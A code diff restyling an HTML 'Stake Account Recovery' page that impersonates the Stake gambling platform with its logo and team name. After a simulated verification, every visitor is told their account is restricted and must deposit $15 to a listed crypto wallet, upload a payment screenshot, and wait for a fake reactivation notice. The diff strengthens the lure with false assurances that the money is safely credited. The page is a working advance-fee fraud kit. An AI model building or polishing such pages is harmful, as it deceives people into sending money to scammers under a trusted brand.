@@ -3,168 +3,216 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>ReStakeAccess Account Recovery</title>
+  <title>Stake Account Recovery</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
   <style>
     * {
-      box-sizing: border-box;
-    }
-    html, body {
       margin: 0;
       padding: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #0f212e;
-      color: #ffffff;
-      min-height: 100vh;
-      overflow-y: auto; /* ✅ Scroll allowed */
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
     }
+
+    body {
+      background: radial-gradient(circle at top left, #1a2a3b, #0f212e);
+      color: #ffffff;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: auto; /* changed here */
+    }
+
+    ::-webkit-scrollbar {
+      width: 6px;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #02dc05;
+      border-radius: 4px;
+    }
+
     .container {
-      background-color: #1e2f40;
-      max-width: 500px;
-      margin: 40px auto;
+      background: rgba(47, 69, 83, 0.9);
+      backdrop-filter: blur(8px);
       padding: 25px;
       border-radius: 16px;
-      box-shadow: 0 0 20px rgba(0,255,150,0.1);
+      box-shadow: 0 0 20px rgba(2, 220, 5, 0.15);
+      width: 90%;
+      max-width: 480px;
+      position: relative;
+      z-index: 1;
     }
+
     .header {
       text-align: center;
+      margin-bottom: 25px;
     }
+
     .header img {
       width: 120px;
-      margin: 20px auto;
+      margin-bottom: 10px;
     }
+
     .header h2 {
       color: #02dc05;
-      margin-bottom: 20px;
+      font-size: 1.8rem;
+      font-weight: 600;
     }
+
     .form-group {
-      margin-bottom: 18px;
+      margin-bottom: 15px;
     }
+
     label {
-      font-weight: bold;
-      display: block;
+      font-weight: 500;
       margin-bottom: 6px;
+      display: block;
+      color: #ffffff;
     }
-    input, select, button {
+
+    input, select {
       width: 100%;
       padding: 10px;
+      background: #11232f;
+      border: 2px solid transparent;
       border-radius: 8px;
-      border: none;
-      font-size: 1rem;
+      color: #fff;
+      font-size: 0.95rem;
+      transition: border 0.3s;
     }
-    input, select {
-      background-color: #283b4c;
+
+    input:focus, select:focus {
+      border: 2px solid #02dc05;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background: #02dc05;
+      color: #0f212e;
+      font-weight: bold;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    button:hover {
+      box-shadow: 0 0 10px #02dc05, 0 0 20px #02dc05;
+    }
+
+    button:disabled {
+      background: #555;
+      color: #aaa;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    .copy-btn {
+      margin-top: 5px;
+      background-color: #166ae0;
       color: #fff;
     }
-    button {
-      background-color: #02dc05;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-      transition: background 0.3s ease;
-    }
-    button:disabled {
-      background-color: #444;
-      cursor: not-allowed;
-    }
-    .copy-btn {
-      background-color: #2c8fff;
+
+    .message {
+      font-size: 0.9rem;
+      color: #00ff9d;
       margin-top: 8px;
     }
-    .message {
-      margin-top: 10px;
-      font-size: 0.95rem;
-      color: #00ffae;
-    }
+
     #popup {
+      display: none;
       position: fixed;
-      z-index: 9999;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      background-color: #1e2f40;
+      background-color: rgba(47, 69, 83, 0.95);
+      color: #fff;
       padding: 25px;
       border-radius: 14px;
-      box-shadow: 0 0 30px rgba(0,255,150,0.2);
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      z-index: 9999;
+      animation: fadeIn 0.4s ease;
+      max-width: 90%;
       text-align: center;
-      display: none;
     }
+
     #popup p {
-      color: #ffdc00;
-      font-weight: bold;
       font-size: 1rem;
+      color: #ffdc00;
+      font-weight: 500;
     }
-    #popup button {
-      margin-top: 15px;
-      background-color: #02dc05;
-      color: #fff;
-      padding: 10px 20px;
-      border-radius: 8px;
-    }
-    .blur-effect {
+
+    .blur {
       filter: blur(5px);
       pointer-events: none;
       user-select: none;
     }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95) translate(-50%, -50%); }
+      to { opacity: 1; transform: scale(1) translate(-50%, -50%); }
+    }
   </style>
 </head>
 <body>
-  <div id="main-content">
-    <div class="container">
-      <div class="header">
-        <img src="stake-logo-white.png" alt="Stake Logo">
-        <h2>Account Recovery</h2>
-      </div>
-
-      <div class="form-group">
-        <label>Username</label>
-        <input type="text" id="username" placeholder="Enter Stake Username">
-        <button onclick="verifyUsername()">Verify</button>
-        <div class="message" id="verify-msg"></div>
-      </div>
-
-      <div class="form-group">
-        <label>Coin</label>
-        <select id="coin" onchange="updateAddress()">
-          <option value="">--Select Coin--</option>
-          <option value="usdt">USDT</option>
-          <option value="btc">BTC</option>
-          <option value="trx">TRX</option>
-          <option value="eth">ETH</option>
-        </select>
-      </div>
-
-      <div class="form-group">
-        <label>Network</label>
-        <select id="network" onchange="updateAddress()">
-          <option value="">--Select Network--</option>
-          <option value="trc20">TRC20</option>
-          <option value="bsc">BSC</option>
-        </select>
-      </div>
-
-      <div class="form-group">
-        <label>Wallet Address</label>
-        <input type="text" id="address" readonly>
-        <button class="copy-btn" onclick="copyAddress()">Copy</button>
-      </div>
-
-      <div class="form-group">
-        <label>Amount ($)</label>
-        <input type="number" id="amount" placeholder="Enter Amount">
-      </div>
-
-      <div class="form-group">
-        <label>Upload Screenshot</label>
-        <input type="file" id="screenshot">
-      </div>
-
-      <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
+  <div id="main-content" class="container">
+    <div class="header">
+      <img src="stake-logo-white.png" alt="Stake Logo" />
+      <h2>Account Recovery</h2>
     </div>
+
+    <div class="form-group">
+      <label for="username">Username</label>
+      <input type="text" id="username" placeholder="Enter Stake Username" />
+      <button onclick="verifyUsername()">Verify</button>
+      <div class="message" id="verify-msg"></div>
+    </div>
+
+    <div class="form-group">
+      <label for="coin">Select Coin</label>
+      <select id="coin" onchange="updateAddress()">
+        <option value="">--Select Coin--</option>
+        <option value="usdt">USDT</option>
+        <option value="btc">BTC</option>
+        <option value="trx">TRX</option>
+        <option value="eth">Ethereum</option>
+      </select>
+    </div>
+
+    <div class="form-group">
+      <label for="network">Select Network</label>
+      <select id="network" onchange="updateAddress()">
+        <option value="">--Select Network--</option>
+        <option value="trc20">TRC20</option>
+        <option value="bsc">BSC</option>
+      </select>
+    </div>
+
+    <div class="form-group">
+      <label for="address">Wallet Address</label>
+      <input type="text" id="address" readonly />
+      <button class="copy-btn" onclick="copyAddress()">Copy</button>
+    </div>
+
+    <div class="form-group">
+      <label for="amount">Enter Amount (USD)</label>
+      <input type="number" id="amount" />
+    </div>
+
+    <div class="form-group">
+      <label for="screenshot">Upload Screenshot</label>
+      <input type="file" id="screenshot" />
+    </div>
+
+    <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
   </div>
 
   <div id="popup">
-    <p>Your account recovery request has been received.<br>We forward your query to the Stake technical team.<br>Your Stake account will be fully active within 24 - 72 hours.</p>
-    <button onclick="closePopup()">OK</button>
+    <p>Your account recovery request has been successfully received. We have forwarded your request to the Stake technical team for prompt action. Your Stake account will be fully reactivated within 24 to 72 hours.</p>
+    <button onclick="location.reload()">OK</button>
   </div>
 
   <script>
@@ -189,7 +237,7 @@
       const msg = document.getElementById('verify-msg');
       msg.innerHTML = 'Verifying...';
       setTimeout(() => {
-        msg.innerHTML = 'Your Stake account is currently restricted to withdrawal-only mode. To unlock full access, a minimum deposit of $15 is required.';
+        msg.innerHTML = 'Your Stake account is currently restricted to withdrawal-only mode. To unlock full access, a minimum deposit of $15 is required. This amount will be safely credited to your Stake account, ensuring the security and protection of your funds.';
       }, 1500);
     }
 
@@ -211,7 +259,7 @@
       address.select();
       address.setSelectionRange(0, 99999);
       navigator.clipboard.writeText(address.value);
-      alert("Address copied!");
+      alert('Address copied!');
     }
 
     function checkForm() {
@@ -226,17 +274,13 @@
       btn.disabled = !(username && coin && network && address && amount && screenshot);
     }
 
-    document.querySelectorAll('input, select').forEach(el => {
-      el.addEventListener('change', checkForm);
+    document.querySelectorAll('input, select').forEach(input => {
+      input.addEventListener('change', checkForm);
     });
 
     function submitForm() {
-      document.getElementById('main-content').classList.add('blur-effect');
+      document.getElementById('main-content').classList.add('blur');
       document.getElementById('popup').style.display = 'block';
-    }
-
-    function closePopup() {
-      location.reload();
     }
   </script>
 </body>
